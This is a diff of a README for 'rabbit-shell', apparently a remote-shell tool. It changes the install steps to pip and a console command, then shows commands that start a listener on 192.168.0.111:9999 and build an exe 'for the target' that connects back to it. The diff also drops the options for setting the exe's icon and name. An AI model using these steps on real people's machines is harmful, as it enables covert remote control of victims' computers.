@@ -4,26 +4,37 @@
 
 
 
-
-
 ##  Installation.
+
+
+
+### By pip.
+
+```bash
+pip install rabbit_shell
+```
+install using pypi.
+
+or
+###  By clone.
 
 ```bash
 git clone https://github.com/greedalbadi/rabbit-shell.git
 cd rabbit-shell
-pip install -r requirements.txt
+pip install .
 ```
+install using git clone.
 
-###### The go to tool file is rabbit.py.
-
-
-
-
+# Usage.
+```bash
+rsb --help
+```
+print available arguments with a tiny explain or just rsb.
 
 ## Run server and start listening.
 
 ```bash
-python rabbit.py --server -a 192.168.0.111 -p 9999
+rsb --server -a 192.168.0.111 -p 9999
 ```
 
 > - --server is args container
@@ -39,14 +50,13 @@ python rabbit.py --server -a 192.168.0.111 -p 9999
 ## Generate exe for the target.
 
 ```bash
-python rabbit.py --client -a 192.168.0.111 -p 9999
+rsb --client -a 192.168.0.111 -p 9999
 ```
 
 > - --client is args container
 > - -a is server or device ip address
 > - -p is wich port you'll be listening to
-> - -i (optional) exe icon
-> - -n (optional) exe name
+
 
 ###### This will generate an exe inside a dist directory you may delete build folder, when the exe runs It'll create
 
